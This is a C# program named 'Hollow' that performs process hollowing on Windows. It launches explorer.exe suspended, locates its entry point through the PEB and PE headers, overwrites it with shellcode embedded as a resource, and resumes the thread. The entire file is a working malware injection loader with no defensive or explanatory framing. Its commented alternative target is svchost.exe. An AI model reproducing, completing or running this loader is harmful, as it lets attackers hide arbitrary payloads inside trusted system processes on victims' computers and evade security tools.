using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Hollow
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet =CharSet.Ansi)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] 
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess, 
            int procInformationClass, 
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint tmp);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);


        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                null,
                "C:\\Windows\\explorer.exe",
                //"C:\\Windows\\system32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(
                hProcess,
                0,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(
                hProcess,
                ptrToImageBase,
                addrBuf,
                addrBuf.Length,
                out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(
                hProcess,
                svchostBase,
                data,
                data.Length,
                out nRead);

            Console.WriteLine($"ReadProcessMemory is: {svchostBase}");

            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint optHdr = e_lfanew + 0x28;
            uint entryPointRVA = BitConverter.ToUInt32(data, (int)optHdr);
            IntPtr entryPointAddr = (IntPtr)(entryPointRVA + (Int64)svchostBase);
            Console.WriteLine($"EntryPointAddr: {entryPointAddr.ToString()}");

            
            byte[] buf = Properties.Resources.shellcode;

            Console.WriteLine($"[*] PEB Base Address: {bi.PebBaseAddress.ToString("X")}");
            Console.WriteLine($"[*] ImageBase from PEB: {svchostBase.ToString("X")}");
            Console.WriteLine($"[*] EntryPoint RVA: {entryPointRVA.ToString("X")}");
            Console.WriteLine($"[*] Final EntryPoint Address: {entryPointAddr.ToString("X")}");

            Console.WriteLine($"[*] buf size {buf.Length}");
            Console.WriteLine("[*] Hollowing started.");

            WriteProcessMemory(hProcess, entryPointAddr, buf, buf.Length, out nRead);
            bool writeSuccess = WriteProcessMemory(hProcess, entryPointAddr, buf, buf.Length, out nRead);
            if ((int)nRead != buf.Length)
            {
                Console.WriteLine($"[!] AVISO: Apenas {nRead} de {buf.Length} bytes foram escritos!");
            }
            ResumeThread(pi.hThread);
            uint resumeResult = ResumeThread(pi.hThread);
            Console.WriteLine($"[*] ResumeThread Result: {resumeResult} (Expect > 0)");


        }
    }
}
